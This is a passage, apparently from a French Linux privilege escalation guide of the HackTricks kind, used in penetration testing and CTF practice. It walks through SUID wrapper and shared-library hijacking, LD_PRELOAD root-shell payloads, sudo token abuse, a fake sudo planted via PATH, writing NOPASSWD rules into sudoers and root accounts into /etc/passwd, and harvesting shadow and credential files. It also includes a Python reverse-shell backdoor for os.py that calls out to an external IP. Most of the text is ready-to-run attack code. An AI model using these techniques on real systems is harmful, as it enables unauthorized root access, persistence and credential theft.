Une mauvaise configuration courante d’une application personnalisée consiste en un wrapper binaire SUID appartenant à root qui exécute un script, tandis que le script lui-même est accessible en écriture pour les utilisateurs non privilégiés.

Schéma typique :
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Si `/usr/local/bin/backup.sh` est accessible en écriture, vous pouvez ajouter des commandes de payload, puis exécuter le wrapper SUID :
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Vérifications rapides :
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Ce vecteur d'attaque est particulièrement courant dans les wrappers de « maintenance »/« backup » fournis dans `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable d'environnement **LD_PRELOAD** permet de spécifier une ou plusieurs bibliothèques partagées (fichiers `.so`) à charger par le loader avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce processus est appelé preloading d'une bibliothèque.

Cependant, afin de maintenir la sécurité du système et d'empêcher l'exploitation de cette fonctionnalité, notamment avec les exécutables **suid/sgid**, le système applique certaines conditions :

- Le loader ignore **LD_PRELOAD** pour les exécutables dont l'ID utilisateur réel (_ruid_) ne correspond pas à l'ID utilisateur effectif (_euid_).
- Pour les exécutables avec suid/sgid, seules les bibliothèques situées dans les chemins standard et qui sont également suid/sgid sont preloadées.

Une privilege escalation peut se produire si vous pouvez exécuter des commandes avec `sudo` et que la sortie de `sudo -l` inclut l'instruction **env_keep+=LD_PRELOAD**. Cette configuration permet à la variable d'environnement **LD_PRELOAD** de persister et d'être reconnue même lorsque des commandes sont exécutées avec `sudo`, ce qui peut entraîner l'exécution de code arbitraire avec des privilèges élevés.<sup>[[9]](#references)</sup>
```
Defaults        env_keep += LD_PRELOAD
```
Enregistrer sous **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Puis **compilez-le** avec :
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Enfin, **escaladez les privilèges** en exécutant
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc similaire peut être exploité si l’attaquant contrôle la variable d’environnement **LD_LIBRARY_PATH**, car il contrôle le chemin dans lequel les libraries vont être recherchées.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binaire SUID – injection de .so

Lorsqu'on rencontre un binaire doté de permissions **SUID** qui semble inhabituel, il est recommandé de vérifier s'il charge correctement les fichiers **.so**. Cela peut être vérifié en exécutant la commande suivante :<sup>[[17]](#references)</sup>
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Par exemple, rencontrer une erreur comme _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggère un potentiel d’exploitation.

Pour l’exploiter, il faudrait créer un fichier C, par exemple _"/path/to/.config/libcalc.c"_, contenant le code suivant :
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Une fois compilé et exécuté, ce code vise à élever les privilèges en manipulant les permissions des fichiers et en exécutant un shell avec des privilèges élevés.

Compilez le fichier C ci-dessus en un fichier d’objet partagé (.so) avec :
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Enfin, l’exécution du binaire SUID concerné devrait déclencher l’exploit, permettant une compromission potentielle du système.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Maintenant que nous avons trouvé un binaire SUID chargeant une bibliothèque depuis un dossier où nous pouvons écrire, créons la bibliothèque dans ce dossier avec le nom nécessaire :
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si vous obtenez une erreur telle que
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
cela signifie que la bibliothèque que vous avez générée doit avoir une fonction appelée `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) est une liste organisée de binaires Unix pouvant être exploités par un attaquant pour contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est son équivalent pour les cas où vous pouvez **uniquement injecter des arguments** dans une commande.

Le projet répertorie des fonctions légitimes de binaires Unix pouvant être détournées pour sortir de shells restreints, escalader ou maintenir des privilèges élevés, transférer des fichiers, lancer des bind shells et des reverse shells, et faciliter d’autres tâches de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si vous pouvez accéder à `sudo -l`, vous pouvez utiliser l’outil [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) pour vérifier s’il trouve une manière d’exploiter une règle sudo.

### Réutilisation des jetons Sudo

Dans les cas où vous disposez d’un **accès sudo** mais pas du mot de passe, vous pouvez escalader vos privilèges en **attendant l’exécution d’une commande sudo, puis en détournant le jeton de session**.<sup>[[18]](#references)</sup>

Conditions requises pour escalader les privilèges :

- Vous disposez déjà d’un shell en tant qu’utilisateur "_sampleuser_"
- "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose au cours des **15 dernières minutes** (par défaut, il s’agit de la durée du jeton sudo qui nous permet d’utiliser `sudo` sans saisir de mot de passe)
- `cat /proc/sys/kernel/yama/ptrace_scope` vaut 0
- `gdb` est accessible (vous devez pouvoir le téléverser)

(Vous pouvez activer temporairement `ptrace_scope` avec `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`, ou le modifier de façon permanente dans `/etc/sysctl.d/10-ptrace.conf` en définissant `kernel.yama.ptrace_scope = 0`.)

Si toutes ces conditions sont réunies, **vous pouvez escalader vos privilèges en utilisant :** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Le **premier exploit** (`exploit.sh`) créera le binaire `activate_sudo_token` dans _/tmp_. Vous pouvez l’utiliser pour **activer le jeton sudo dans votre session** (vous n’obtiendrez pas automatiquement un shell root, exécutez `sudo su`) :
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Le **second exploit** (`exploit_v2.sh`) créera un shell sh dans _/tmp_ **appartenant à root avec setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Le **troisième exploit** (`exploit_v3.sh`) va **créer un fichier sudoers** qui rend les **sudo tokens éternels et permet à tous les utilisateurs d’utiliser sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si vous avez des **permissions d’écriture** dans le dossier ou sur l’un des fichiers créés à l’intérieur de celui-ci, vous pouvez utiliser le binaire [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un sudo token pour un utilisateur et un PID**.\
Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous disposez d’un shell en tant que cet utilisateur avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin de connaître le mot de passe en exécutant :
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Le fichier `/etc/sudoers` et les fichiers présents dans `/etc/sudoers.d` configurent qui peut utiliser `sudo` et de quelle manière. Ces fichiers **ne peuvent par défaut être lus que par l’utilisateur root et le groupe root**.\
**Si** vous pouvez **lire** ce fichier, vous pourriez **obtenir des informations intéressantes**, et si vous pouvez **écrire** dans n’importe quel fichier, vous pourrez **escalader les privilèges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si vous pouvez écrire, vous pouvez exploiter cette permission.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Une autre façon d’abuser de ces autorisations :
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Il existe des alternatives au binaire `sudo`, comme `doas` pour OpenBSD. Pensez à vérifier sa configuration dans `/etc/doas.conf`.
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Si `doas` autorise un éditeur ou un interpréteur, vérifiez les échappements de type GTFOBins :
```bash
doas vim
:!/bin/sh
```
### Détournement de Sudo

Si vous savez qu’un **utilisateur se connecte habituellement à une machine et utilise `sudo`** pour élever ses privilèges, et que vous avez obtenu un shell dans le contexte de cet utilisateur, vous pouvez **créer un nouvel exécutable sudo** qui exécutera votre code en tant que root, puis la commande de l’utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple en ajoutant le nouveau chemin dans .bash_profile) afin que, lorsque l’utilisateur exécute sudo, votre exécutable sudo soit exécuté.

Notez que si l’utilisateur utilise un shell différent (autre que bash), vous devrez modifier d’autres fichiers pour ajouter le nouveau chemin. Par exemple, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifie `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Vous trouverez un autre exemple dans [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou en exécutant quelque chose comme :
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Bibliothèque partagée

### ld.so

Le fichier `/etc/ld.so.conf` indique **d'où proviennent les fichiers de configuration chargés**. Généralement, ce fichier contient le chemin suivant : `include /etc/ld.so.conf.d/*.conf`

Cela signifie que les fichiers de configuration de `/etc/ld.so.conf.d/*.conf` seront lus. Ces fichiers de configuration **pointent vers d'autres dossiers** dans lesquels les **bibliothèques** vont être **recherchées**. Par exemple, le contenu de `/etc/ld.so.conf.d/libc.conf` est `/usr/local/lib`. **Cela signifie que le système recherchera les bibliothèques dans `/usr/local/lib`**.

Si, pour une raison quelconque, **un utilisateur dispose de permissions d'écriture** sur l'un des chemins indiqués : `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, n'importe quel fichier à l'intérieur de `/etc/ld.so.conf.d/` ou n'importe quel dossier indiqué dans le fichier de configuration à l'intérieur de `/etc/ld.so.conf.d/*.conf`, il peut être en mesure d'escalader ses privilèges.\
Consultez **comment exploiter cette mauvaise configuration** à la page suivante :


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
En copiant la bibliothèque dans `/var/tmp/flag15/`, elle sera utilisée par le programme à cet emplacement, comme indiqué dans la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ensuite, créez une bibliothèque malveillante dans `/var/tmp` avec `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacités

Les Linux capabilities fournissent à un processus un **sous-ensemble des privilèges root disponibles**. Cela permet effectivement de décomposer les **privilèges root en unités plus petites et distinctes**. Chacune de ces unités peut ensuite être accordée indépendamment à des processus. De cette manière, l'ensemble complet des privilèges est réduit, ce qui diminue les risques d'exploitation.\
Consultez la page suivante pour **en apprendre davantage sur les capabilities et la manière de les détourner** :


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Permissions des répertoires

Dans un répertoire, le **bit « execute »** implique que l'utilisateur concerné peut faire un **cd** dans le dossier.\
Le bit **« read »** implique que l'utilisateur peut **lister** les **fichiers**, et le bit **« write »** implique que l'utilisateur peut **supprimer** et **créer** de nouveaux **fichiers**.

## ACLs

Les Access Control Lists (ACLs) représentent la couche secondaire des permissions discrétionnaires, capable de **remplacer les permissions ugo/rwx traditionnelles**. Ces permissions améliorent le contrôle de l'accès aux fichiers ou aux répertoires en autorisant ou en refusant des droits à des utilisateurs spécifiques qui n'en sont pas les propriétaires ou qui ne font pas partie du groupe. Ce niveau de **granularité garantit une gestion plus précise des accès**. Plus de détails sont disponibles [**ici**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Accorder** à l'utilisateur « kali » des permissions de lecture et d'écriture sur un fichier :
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Récupérer** des fichiers avec des ACL spécifiques depuis le système :
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Backdoor ACL cachée dans les fichiers additionnels de sudoers

Une mauvaise configuration courante consiste en un fichier appartenant à root dans `/etc/sudoers.d/` avec le mode `440`, qui accorde tout de même un accès en écriture à un utilisateur disposant de faibles privilèges via une ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Si vous voyez quelque chose comme `user:alice:rw-`, l’utilisateur peut ajouter une règle sudo malgré des bits de mode restrictifs :
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Il s’agit d’une voie de persistence/privesc via ACL à fort impact, car elle est facile à manquer lors des revues limitées à `ls -l`.

## Sessions shell ouvertes

Dans les **anciennes versions**, vous pouvez **hijack** certaines sessions **shell** d’un autre utilisateur (**root**).\
Dans les **versions les plus récentes**, vous pourrez vous **connecter** uniquement aux sessions screen de votre propre utilisateur. Cependant, vous pourriez trouver des **informations intéressantes à l’intérieur de la session**.

### screen sessions hijacking

**Lister les sessions screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![détournement de sessions screen - Emplacements des sockets (certains systèmes exposent l’un comme un lien symbolique vers l’autre) : ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**S’attacher à une session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Détournement de sessions tmux

Il s’agissait d’un problème concernant les **anciennes versions de tmux**. Je n’ai pas pu détourner une session tmux (v2.1) créée par root en tant qu’utilisateur non privilégié.

**Lister les sessions tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Emplacements des sockets (certains systèmes en exposent un comme lien symbolique de l’autre) - détournement de sessions tmux : tmux -S /tmp/dev sess ls Lister à l’aide de ce socket, vous pouvez démarrer une session tmux sur ce socket...](<../../images/image (837).png>)

**S’attacher à une session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Consultez **Valentine box from HTB** pour un exemple.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Toutes les clés SSL et SSH générées sur des systèmes basés sur Debian (Ubuntu, Kubuntu, etc.) entre septembre 2006 et le 13 mai 2008 peuvent être affectées par ce bug.\
Ce bug est dû à la création d'une nouvelle clé SSH sur ces systèmes d'exploitation, car **seulement 32 768 variations étaient possibles**. Cela signifie que toutes les possibilités peuvent être calculées et qu'**avec la clé publique SSH, vous pouvez rechercher la clé privée correspondante**. Vous pouvez trouver les possibilités calculées ici : [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valeurs de configuration SSH intéressantes

- **PasswordAuthentication:** indique si l'authentification par mot de passe est autorisée. La valeur par défaut est `no`.
- **PubkeyAuthentication:** indique si l'authentification par clé publique est autorisée. La valeur par défaut est `yes`.
- **PermitEmptyPasswords**: lorsque l'authentification par mot de passe est autorisée, indique si le serveur autorise la connexion aux comptes dont le mot de passe est vide. La valeur par défaut est `no`.

### Fichiers de contrôle des connexions

Ces fichiers déterminent qui peut se connecter et de quelle manière :

- **`/etc/nologin`**: s'il est présent, bloque les connexions des utilisateurs autres que root et affiche son message.
- **`/etc/securetty`**: restreint les endroits depuis lesquels root peut se connecter (liste d'autorisation des TTY).
- **`/etc/motd`**: bannière affichée après la connexion (peut révéler des informations sur l'environnement ou la maintenance).

### PermitRootLogin

Indique si root peut se connecter via SSH ; la valeur par défaut est `no`. Valeurs possibles :

- `yes`: root peut se connecter avec un mot de passe et une clé privée
- `without-password` ou `prohibit-password`: root peut uniquement se connecter avec une clé privée
- `forced-commands-only`: root peut se connecter uniquement avec une clé privée et si les options de commande sont spécifiées
- `no` : aucune connexion

### AuthorizedKeysFile

Indique les fichiers contenant les clés publiques pouvant être utilisées pour l'authentification des utilisateurs. Il peut contenir des tokens comme `%h`, qui seront remplacés par le répertoire personnel. **Vous pouvez indiquer des chemins absolus** (commençant par `/`) ou des **chemins relatifs au répertoire personnel de l'utilisateur**. Par exemple :
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Cette configuration indique que si vous essayez de vous connecter avec la clé **private** de l’utilisateur "**testusername**", ssh comparera la clé publique de votre clé avec celles situées dans `/home/testusername/.ssh/authorized_keys` et `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Le transfert de l’agent SSH vous permet d’**utiliser vos clés SSH locales au lieu de laisser des clés** (sans phrase secrète !) sur votre serveur. Vous pourrez donc **jump** via ssh **vers un hôte**, puis depuis celui-ci **jump** **vers un autre** hôte en **utilisant** la **clé** située sur votre **hôte initial**.

Vous devez définir cette option dans `$HOME/.ssh.config` comme suit :
```
Host example.com
ForwardAgent yes
```
Notez que si `Host` est `*`, chaque fois que l’utilisateur se connecte à une autre machine, cet hôte pourra accéder aux clés (ce qui constitue un problème de sécurité).

Le fichier `/etc/ssh_config` peut **outrepasser ces options** et autoriser ou refuser cette configuration.\
Le fichier `/etc/sshd_config` peut **autoriser ou refuser** le forwarding de `ssh-agent` avec le mot-clé `AllowAgentForwarding` (autorisé par défaut).

Si vous constatez que le Forward Agent est configuré dans un environnement, consultez la page suivante, car **vous pourriez être en mesure de l’exploiter pour escalader vos privilèges** :


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Fichiers intéressants

### Fichiers de profil

Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont des **scripts exécutés lorsqu’un utilisateur ouvre un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier l’un d’entre eux, vous pouvez escalader vos privilèges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si un script de profil inhabituel est trouvé, vous devez le vérifier à la recherche de **détails sensibles**.

### Fichiers Passwd/Shadow

Selon l’OS, les fichiers `/etc/passwd` et `/etc/shadow` peuvent utiliser un nom différent ou avoir une copie de sauvegarde. Il est donc recommandé de **tous les trouver** et de **vérifier si vous pouvez les lire** afin de voir **s’ils contiennent des hashes** :
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Dans certains cas, vous pouvez trouver des **hashes de mots de passe** dans le fichier `/etc/passwd` (ou son équivalent)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd accessible en écriture

Commencez par générer un mot de passe avec l’une des commandes suivantes.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ensuite, ajoutez l’utilisateur `hacker` et ajoutez le mot de passe généré.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Par exemple : `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Vous pouvez maintenant utiliser la commande `su` avec `hacker:hacker`

Vous pouvez également utiliser les lignes suivantes pour ajouter un utilisateur factice sans mot de passe.\
AVERTISSEMENT : vous pourriez compromettre la sécurité actuelle de la machine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
REMARQUE : Sur les plateformes BSD, `/etc/passwd` se trouve dans `/etc/pwd.db` et `/etc/master.passwd`. De même, `/etc/shadow` est renommé `/etc/spwd.db`.

Vous devriez vérifier si vous pouvez **écrire dans certains fichiers sensibles**. Par exemple, pouvez-vous écrire dans un **fichier de configuration de service** ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat dans /etc/systemd/,** vous pouvez modifier les lignes :
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Votre backdoor sera exécutée au prochain démarrage de tomcat.

### Vérifier les dossiers

Les dossiers suivants peuvent contenir des sauvegardes ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Vous ne pourrez probablement pas lire le dernier, mais essayez)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Fichiers situés dans des emplacements inhabituels ou appartenant à des propriétaires inhabituels
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Fichiers modifiés au cours des dernières minutes
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Fichiers de DB Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile et docker-compose.yml
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Fichiers cachés
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/binaires dans le PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Fichiers Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sauvegardes**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Fichiers connus contenant des mots de passe

Lisez le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), il recherche **plusieurs fichiers possibles susceptibles de contenir des mots de passe**.\
**Un autre outil intéressant** que vous pouvez utiliser à cette fin est : [**LaZagne**](https://github.com/AlessandroZ/LaZagne), une application open source utilisée pour récupérer de nombreux mots de passe stockés sur un ordinateur local sous Windows, Linux et Mac.

### Journaux

Si vous pouvez lire les journaux, vous pourrez peut-être y trouver des **informations intéressantes/confidentielles**. Plus le journal est étrange, plus il sera intéressant (probablement).\
De plus, certains **journaux d’audit** mal configurés (avec une backdoor ?) peuvent vous permettre **d’enregistrer des mots de passe** dans les journaux d’audit, comme expliqué dans cet article : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Afin de **lire les journaux, le groupe** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) sera vraiment utile.

### Fichiers Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Recherche/Regex de Generic Creds

Vous devriez également vérifier les fichiers contenant le mot "**password**" dans leur **nom** ou dans leur **contenu**, ainsi que rechercher les adresses IP et les e-mails dans les logs, ou des regex de hash.\
Je ne vais pas détailler ici comment effectuer tout cela, mais si cela vous intéresse, vous pouvez consulter les dernières vérifications effectuées par [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Fichiers accessibles en écriture

### Détournement de bibliothèque Python

Si vous savez **depuis quel emplacement** un script Python va être exécuté et que vous **pouvez écrire dans** ce dossier, ou que vous pouvez **modifier des bibliothèques Python**, vous pouvez modifier la bibliothèque de l'OS et y intégrer une backdoor (si vous pouvez écrire à l'emplacement depuis lequel le script Python va être exécuté, copiez-collez la bibliothèque os.py).

Pour **intégrer une backdoor à la bibliothèque**, ajoutez simplement la ligne suivante à la fin de la bibliothèque os.py (modifiez l'IP et le PORT) :
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploitation de `logrotate`

Une vulnérabilité dans `logrotate` permet potentiellement aux utilisateurs disposant de **permissions d’écriture** sur un fichier de log ou ses répertoires parents d’obtenir des privilèges élevés. Cela est dû au fait que `logrotate`, souvent exécuté en tant que **root**, peut être manipulé pour exécuter des fichiers arbitraires, en particulier dans des répertoires comme _**/etc/bash_completion.d/**_. Il est important de vérifier les permissions non seulement dans _/var/log_, mais aussi dans tous les répertoires où la rotation des logs est appliquée.

> [!TIP]
